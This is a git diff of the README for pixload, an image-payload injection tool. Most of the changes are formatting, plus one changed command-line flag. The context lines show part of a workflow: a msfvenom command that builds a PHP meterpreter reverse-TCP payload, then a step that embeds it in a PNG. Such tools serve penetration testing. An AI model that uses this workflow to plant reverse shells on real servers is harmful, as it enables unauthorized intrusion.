@@ -40,7 +40,7 @@ $ msfvenom -p php/meterpreter_reverse_tcp \
 
 3. Inject `payload.php` into the image (i.e. png).
 ```sh
-$ pixload-png -payload "$(cat payload.php)" -output payload.png
+$ pixload-png --payload "$(cat payload.php)" payload.png
 ```
 
 ## SETUP
@@ -416,11 +416,14 @@ payload.webp: RIFF (little-endian) data, Web/P image
 0000004b
 ```
 
-See [pixload-webp(1)](https://github.com/chinarulezzz/pixload/blob/master/pixload-webp.1.pod) manual page for more information.
+See [pixload-webp(1)](https://github.com/chinarulezzz/pixload/blob/master/pixload-webp.1.pod)
+manual page for more information.
 
 ## LICENSE
 
-WTFPL. See [LICENSE](https://github.com/chinarulezzz/pixload/blob/master/LICENSE) for more information.
+WTFPL.
+See [LICENSE](https://github.com/chinarulezzz/pixload/blob/master/LICENSE)
+for more information.
 
 ## LEGAL DISCLAIMER
 
@@ -435,3 +438,7 @@ consent is illegal and punished by law.
 - PAYPAL: `alexandr.savca89@gmail.com`
 
 Highly appreciated.
+
+
+<!-- vim:sw=2:ts=2:sts=2:et:cc=80
+End of file. -->
